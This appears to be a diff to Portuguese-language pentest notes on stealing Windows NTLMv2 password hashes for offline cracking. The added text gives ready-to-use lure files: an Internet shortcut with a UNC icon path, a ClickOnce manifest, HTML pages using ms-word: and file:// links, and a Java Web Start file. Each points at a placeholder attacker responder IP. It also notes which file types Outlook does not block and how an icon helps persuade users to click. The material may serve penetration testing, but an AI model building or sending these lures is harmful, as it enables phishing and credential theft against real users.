@@ -53,7 +53,7 @@ Desta forma, basta exxecutar esses dois comandos para ele fazer a busca via dir 
     
 
 
-## Acesso de escrita
+## Obter hashes de senhas
 
 Aqui basicamente é obter hashes NTLMv2 para tentativa de quebrá-los com john ou hashcat.
 
@@ -75,6 +75,83 @@ Another shortcut in Windows is the Internet shortcuts. You can save this as some
 
     echo [InternetShortcut] > stealMyHashes.url 
     echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
+
+Forma um pouco mais criativa de fazer o ataque seria o seguinte. Informamos um ícone para facilitar a persuasão do usuário a clicar no link:
+
+```
+[InternetShortcut]
+URL=https://securify.nl
+IconIndex=0
+IconFile=\\<responder ip>\leak\leak.ico
+```
+### CLICKONCE
+
+.NET's counterpart to Java Web Start is named ClickOnce. It works in a similar manner, applications are started via a ClickOnce deployment manifest file. These files can also contain UNC paths, similar to Java Web Start. Remarkably, ClickOnce deployment manifests are not blocked by Outlook.
+
+![media-KHdIYp](../../../media/media-KHdIYp.png)
+*Figure 4: ClickOnce deployment manifest files are not blocked in Outlook*
+
+***[leak.application](https://www.datocms-assets.com/21957/1592982308-leak.application):***
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+<assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
+<description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
+<deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
+<dependency>
+<dependentAssembly dependencyType="install" codebase="file://<responder ip>/leak/Leak.exe.manifest" size="32909">
+<assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
+<hash>
+<dsig:Transforms>
+<dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
+</dsig:Transforms>
+<dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
+<dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
+</hash>
+</dependentAssembly>
+</dependency>
+</asmv1:assembly>
+```
+### URL handlers
+
+nomear de leak.html, por exemplo:
+```
+<!DOCTYPE html>
+<html>
+<script>
+location.href = 'ms-word:ofe|u|\\<responder ip>\leak\leak.docx';
+</script>
+</html>
+```
+
+leak.htm, obtendo hashes pelo internet explorer ou edge
+
+```
+<!DOCTYPE html>
+<html>
+<img src="file://<responder ip>/leak/leak.png"/>
+</html>
+```
+
+### Java Web START
+
+Nomear de leak.jnlp, por exemplo:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<jnlp spec="1.0+" codebase="" href="">
+<resources>
+<jar href="file://<responder ip>/leak/leak.jar"/>
+</resources>
+<application-desc/>
+</jnlp>
+```
+
+![media-ReKwxt](../../../media/media-ReKwxt.png)
+*Figure 3: JNLP files are blocked in Outlook*
+
+
 
 ### Shortcut Files (.lnk)
 
